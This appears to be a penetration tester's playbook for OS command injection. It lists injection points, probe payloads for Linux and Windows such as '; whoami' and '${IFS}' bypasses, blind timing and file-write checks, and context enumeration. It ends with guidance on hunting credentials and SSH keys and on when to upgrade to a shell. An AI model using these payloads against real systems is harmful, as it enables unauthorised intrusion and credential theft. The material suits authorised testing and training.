
Execute arbitrary OS commands by abusing unsanitised input.

##### **==Important to Note, 1:==**

Do not try to do all this manually through the web GUI, when you find a potential point of attack, work through this playbook using CURL or Burp.
## **1: Locate Injection Surfaces**

Test **all** user-controlled input vectors:

- URL path parameters (e.g. `/ping/127.0.0.1`)
- Query parameters (`?host=127.0.0.1` or `?host=127.0.0.1;whoami`)
- Form fields (`127.0.0.1 | id`)
- POST body parameters
- HTTP headers (User-Agent, Referer, `User-Agent: curl; id`)
- File names / uploads
- Cookies (modify via Burp)

## **2. Initial Command Execution Tests**

**Goal:** confirm _any_ OS command execution.  
**Rule:** paste in order; stop at the first sign of execution.

---

**Linux (default)**

`; whoami`
`&& whoami`
`| whoami`
`$(whoami)`
``whoami``

If none work, try space bypass:

`;${IFS}whoami`
`&&${IFS}whoami`
`|${IFS}whoami`

If still unclear, switch command (same intent):

`; id`
`&& id`
`| id`
`$(id)`

Final fallback (no operator):

`id`
`whoami`

--- 

**Windows**

`& whoami`
`&& whoami`
`| whoami`
`%COMSPEC% /c whoami`

---
### **Stop when you see**

- Any command output
    
- Any error revealing execution
    
- Any behaviour change attributable to execution (e.g. delay, crash, different response)

Do **not** continue testing once execution is confirmed.
## **3. Blind Command Injection Confirmation**

**Use this only if Stage 2 (Initial Command Execution Tests) shows no output.**

---
### **Linux**

**Time-based confirmation (default)**

`; sleep 5`
`&& sleep 5`
`| ping -c 5 127.0.0.1`

**Expected result**

- HTTP response delayed by ~5 seconds
    

If any delay is observed → **command execution confirmed**.

---

**File-based state confirmation (only if needed)**

Use this when:

- Timing is unreliable
    
- You want persistent proof

**Create State**

`; touch /tmp/pwned && echo test > /tmp/pwned`

**Verify state (second request)**

`; test -f /tmp/pwned && sleep 5`

**Expected result**

- Second request delays → file exists → execution confirmed

---
### **Windows**

**Time-based confirmation (default)**

`& timeout /t 5`
`&& timeout /t 5`
`| ping -n 6 127.0.0.1`

**Expected result**

    HTTP response delayed by ~5 seconds

If any delay is observed → **command execution confirmed**.

---

**File-based state confirmation (only if needed)**

**Create state**

`& echo test > C:\Windows\Temp\pwned.txt`

**Verify state (second request)**

`& if exist C:\Windows\Temp\pwned.txt timeout /t 5`

**Expected result**

Second request delays → file exists → **execution confirmed**

## **4. Context Enumeration**

Before spawning a shell, determine execution context:

**The below commands will vary depending on the pattern that was success during `2. Initial Command Execution Tests`. For example, instead of `whoami` you may be using `; whoami`.**

`whoami`
`id`
`uname -a`
`pwd`
`ls`

Establish:

- OS type
    
- User privileges
    
- Working directory
    
- Shell availability

## **5. Shell Decision**

**Purpose:** decide whether to continue using the command injection channel or upgrade to a shell.

[[Web Shells]]
### **Default Rule**
Do **not** spawn a shell automatically.

Spawn a shell **only if** it gives more capability than the current injection channel.

---

### **Spawn a shell when one or more are true**
- You need to run **many commands quickly**
- You need **interactive access**
- You need easier **file transfer**
- You need a more practical **privilege escalation workflow**
- The injection point is **stable and repeatable**
- You have confirmed or strongly suspect **outbound connectivity**

---

### **Do not spawn a shell yet when**
- Direct command output is already visible and sufficient
- You can still enumerate effectively through the injection point
- The sink appears **fragile** or inconsistent
- You have not yet checked for **quick wins** such as:
  - config files
  - hardcoded credentials
  - web root contents
  - SSH keys
  - sudo/suid opportunities
  - database credentials

---

### **If direct output is available**
Prefer to quickly check for:
- application config
- database credentials
- environment files
- SSH keys
- sudo rights
- SUID binaries
- writable paths
- internal-only services

If those checks are enough to move forward, **do not waste time spawning a shell**.

---

### **If output is blind-only**
A shell may be harder to achieve and less reliable.

Prioritise:
- proving outbound access
- file-write capability
- callback-based execution
- whether a reverse shell is realistic

---

### **Decision**
- If the current channel is enough → **stay with command injection**
- If a shell clearly improves speed, interactivity, or exploitation options → **attempt a shell**
